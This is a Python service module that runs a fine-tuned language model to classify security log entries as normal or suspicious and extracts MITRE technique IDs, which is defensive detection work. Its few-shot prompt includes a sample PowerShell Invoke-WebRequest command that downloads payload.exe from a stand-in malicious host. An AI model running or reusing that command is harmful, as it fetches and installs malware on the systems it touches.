"""
ML Model Service - Handles model loading and inference.
"""
import torch
import json
import re
from transformers import AutoModelForCausalLM, AutoTokenizer
from peft import PeftModel
from typing import Dict, Tuple
from loguru import logger
from app.config import settings


class MLService:
    """Service for ML model operations."""
    
    def __init__(self):
        """Initialize ML service."""
        self.model = None
        self.tokenizer = None
        self.device = settings.DEVICE if torch.cuda.is_available() else "cpu"
        self._model_loaded = False
    
    async def load_model(self):
        """Load the fine-tuned model and tokenizer."""
        if self._model_loaded:
            logger.info("Model already loaded")
            return
        
        try:
            logger.info(f"Loading model from {settings.MODEL_PATH}")
            logger.info(f"Using device: {self.device}")
            
            # Load base model
            logger.info(f"Loading base model: {settings.BASE_MODEL}")
            base_model = AutoModelForCausalLM.from_pretrained(
                settings.BASE_MODEL,
                torch_dtype=torch.float16 if self.device == "cuda" else torch.float32,
                device_map="auto" if self.device == "cuda" else None,
                trust_remote_code=True
            )
            
            # Load LoRA adapters
            logger.info(f"Loading LoRA adapters from: {settings.MODEL_PATH}")
            self.model = PeftModel.from_pretrained(base_model, settings.MODEL_PATH)
            self.model.eval()
            
            # Load tokenizer
            logger.info("Loading tokenizer...")
            self.tokenizer = AutoTokenizer.from_pretrained(
                settings.BASE_MODEL,
                trust_remote_code=True
            )
            self.tokenizer.pad_token = self.tokenizer.eos_token
            
            self._model_loaded = True
            logger.success("Model loaded successfully!")
            
            if self.device == "cuda":
                memory_gb = torch.cuda.memory_allocated() / 1024**3
                logger.info(f"GPU Memory: {memory_gb:.2f} GB")
                
        except Exception as e:
            logger.error(f"Failed to load model: {str(e)}")
            raise RuntimeError(f"Model loading failed: {str(e)}")
    
    def _format_prompt(self, log_input: str) -> str:
        """
        Format logs into few-shot prompt matching training format.
        
        Args:
            log_input: Raw log content (JSON string)
            
        Returns:
            Formatted prompt string
        """
        # Truncate if too long
        if len(log_input) > settings.MAX_INPUT_CHARS:
            log_input = log_input[:settings.MAX_INPUT_CHARS] + "... [truncated]"
        
        # Few-shot prompt matching training format
        prompt = f"""You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.

Output format:
Status: Normal OR Status: Suspicious
Reason: Brief explanation

### Example 1:
Input: {{"EventID": 4624, "LogonType": 2, "Account": "user@domain.com", "Workstation": "DESKTOP-123"}}
Response:
Status: Normal
Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.

### Example 2:
Input: {{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\temp\\\\mal.exe", "User": "SYSTEM"}}
Response:
Status: Suspicious
Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download (T1105 - Ingress Tool Transfer).

### Now analyze this log:
Input: {log_input}
Response:
"""
        return prompt
    
    def _parse_output(self, output: str) -> Dict[str, any]:
        """
        Parse model output to extract status, reason, and MITRE techniques.
        
        Args:
            output: Raw model output
            
        Returns:
            Dictionary with parsed results
        """
        result = {
            "status": "Unknown",
            "reason": "",
            "mitre_techniques": [],
            "raw_output": output
        }
        
        output_clean = output.strip()
        
        # Parse status - exact training format
        status_patterns = [
            r'Status:\s*(Normal|Suspicious)',  # PRIMARY
            r'status:\s*(normal|suspicious)',  # Lowercase
        ]
        
        for pattern in status_patterns:
            match = re.search(pattern, output_clean, re.IGNORECASE)
            if match:
                matched = match.group(1).lower()
                if "normal" in matched:
                    result["status"] = "Normal"
                elif "suspicious" in matched:
                    result["status"] = "Suspicious"
                else:
                    result["status"] = match.group(1).capitalize()
                break
        
        # Keyword fallback
        if result["status"] == "Unknown":
            lower = output_clean.lower()
            suspicious_keywords = ['suspicious', 'attack', 'malicious', 'threat']
            normal_keywords = ['normal', 'benign', 'legitimate']
            
            suspicious_count = sum(1 for kw in suspicious_keywords if kw in lower)
            normal_count = sum(1 for kw in normal_keywords if kw in lower)
            
            if suspicious_count > normal_count and suspicious_count > 0:
                result["status"] = "Suspicious"
            elif normal_count > 0:
                result["status"] = "Normal"
        
        # Extract reason
        reason_patterns = [
            r'Reason:\s*([^\n]+)',  # PRIMARY
            r'reason:\s*([^\n]+)',
        ]
        
        for pattern in reason_patterns:
            match = re.search(pattern, output_clean, re.DOTALL | re.IGNORECASE)
            if match:
                result["reason"] = match.group(1).strip()[:500]
                break
        
        # Extract MITRE techniques
        mitre_pattern = r'T\d{4}(?:\.\d{3})?'
        result["mitre_techniques"] = list(set(re.findall(mitre_pattern, output_clean)))
        
        return result
    
    async def analyze_log(self, log_content: str) -> Tuple[str, str, list, str, str]:
        """
        Analyze a log chunk and return classification results.
        
        Args:
            log_content: Log content as string (JSON format expected)
            
        Returns:
            Tuple of (status, reason, mitre_techniques, raw_output, error_message)
        """
        if not self._model_loaded:
            return "Error", "Model not loaded", [], "", "Model not initialized. Please wait for model loading."
        
        try:
            # Validate JSON if it looks like JSON
            if log_content.strip().startswith('{') or log_content.strip().startswith('['):
                try:
                    json.loads(log_content)
                except json.JSONDecodeError as e:
                    return "Error", f"Invalid JSON: {str(e)}", [], "", str(e)
            
            # Format prompt
            prompt = self._format_prompt(log_content)
            
            # Tokenize
            inputs = self.tokenizer(
                prompt,
                return_tensors="pt",
                truncation=True,
                max_length=settings.MAX_LENGTH_TOKENS
            )
            inputs = {k: v.to(self.model.device) for k, v in inputs.items()}
            
            # Generate
            logger.info("Generating prediction...")
            with torch.no_grad():
                outputs = self.model.generate(
                    **inputs,
                    max_new_tokens=settings.MAX_NEW_TOKENS,
                    temperature=settings.TEMPERATURE,
                    do_sample=True,
                    top_p=settings.TOP_P,
                    pad_token_id=self.tokenizer.eos_token_id
                )
            
            # Decode
            generated_text = self.tokenizer.decode(
                outputs[0][inputs['input_ids'].shape[1]:],
                skip_special_tokens=True
            )
            
            logger.info(f"Generated {len(generated_text)} characters")
            
            # Parse output
            result = self._parse_output(generated_text)
            
            return (
                result["status"],
                result["reason"],
                result["mitre_techniques"],
                result["raw_output"],
                ""  # No error
            )
            
        except Exception as e:
            logger.error(f"Analysis error: {str(e)}")
            return "Error", f"Analysis failed: {str(e)}", [], "", str(e)
    
    def is_loaded(self) -> bool:
        """Check if model is loaded."""
        return self._model_loaded


# Global ML service instance
ml_service = MLService()
